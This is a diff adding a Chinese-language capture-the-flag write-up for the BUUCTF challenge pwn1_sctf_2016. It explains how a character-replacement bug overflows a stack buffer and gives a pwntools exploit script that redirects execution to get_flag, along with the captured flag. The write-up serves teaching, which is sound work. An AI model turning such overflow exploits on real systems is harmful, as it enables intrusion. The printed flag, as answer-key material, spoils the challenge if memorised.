@@ -124,4 +124,50 @@ io.interactive()
 
 ------
 
-### 
+### [pwn1_sctf_2016](https://buuoj.cn/challenges#pwn1_sctf_2016)
+
+先`file ./test`查看文件类型和`checksec --file=test`检查了一下文件保护情况。
+
+![](https://paper.tanyaodan.com/BUUCTF/pwn1_sctf_2016/1.png)
+
+用`IDA Pro 32bit`打开`pwn1_sctf_2016`后按`F5`反汇编源码并查看主函数，发现`vuln()`函数。
+
+![](https://paper.tanyaodan.com/BUUCTF/pwn1_sctf_2016/2.png)
+
+双击`vuln()`函数查看源码，分析后发现`fgets()`函数限制输入`32`个字节到变量`s`中，乍一看并没有超出可用栈大小。
+
+![](https://paper.tanyaodan.com/BUUCTF/pwn1_sctf_2016/3.png)
+
+再按一次`F5`后发现第`19`行的`replace()`函数会把输入的`I`替换成`you`，1个字符变成3个字符。	并且在第`27`行会对原来的`s`变量重新赋值。
+
+![](https://paper.tanyaodan.com/BUUCTF/pwn1_sctf_2016/4.png)
+
+在`Functions window`可以看到有一个`get_flag()`函数，按`F5`反汇编可以看到这是一个系统调用，且`get_flag()`函数的起始地址为`0x8048F0D`。
+
+![](https://paper.tanyaodan.com/BUUCTF/pwn1_sctf_2016/5.png)
+
+查看栈结构发现`s`的长度为`0x3c`，即`60`个字节，而输入被限制在`32`个字节内，每个`I`可以被替换成`you`，所以输入`60÷3=20`个`I`就能让栈溢出，然后`db 4 dup(?)` 还需要占用`4`个字节的内存，最后加上`get_flag()`函数的起始地址`0x8048F0D`构成`payload`。
+
+![](https://paper.tanyaodan.com/BUUCTF/pwn1_sctf_2016/6.png)
+
+
+
+编写`Python`脚本连接`node4.buuoj.cn`的监听端口`26333`，发送`payload`即可得到`flag{efb5872f-b8d0-4892-9ed3-ea71e8a7a983}`。
+
+```python
+from pwn import *
+
+io = remote('node4.buuoj.cn', 26333)
+e = ELF('pwn1_sctf_2016')
+address = e.symbols['get_flag']
+log.success('get_flag_address => %s' % hex(address).upper())
+payload = b'I'*20 + b'a'*0x4 + p32(address)
+# payload = b'I'*20 + b'a'*0x4 + p32(0x8048F0D)
+io.sendline(payload)
+io.interactive()
+```
+
+![](https://paper.tanyaodan.com/BUUCTF/pwn1_sctf_2016/7.png)
+
+------
+
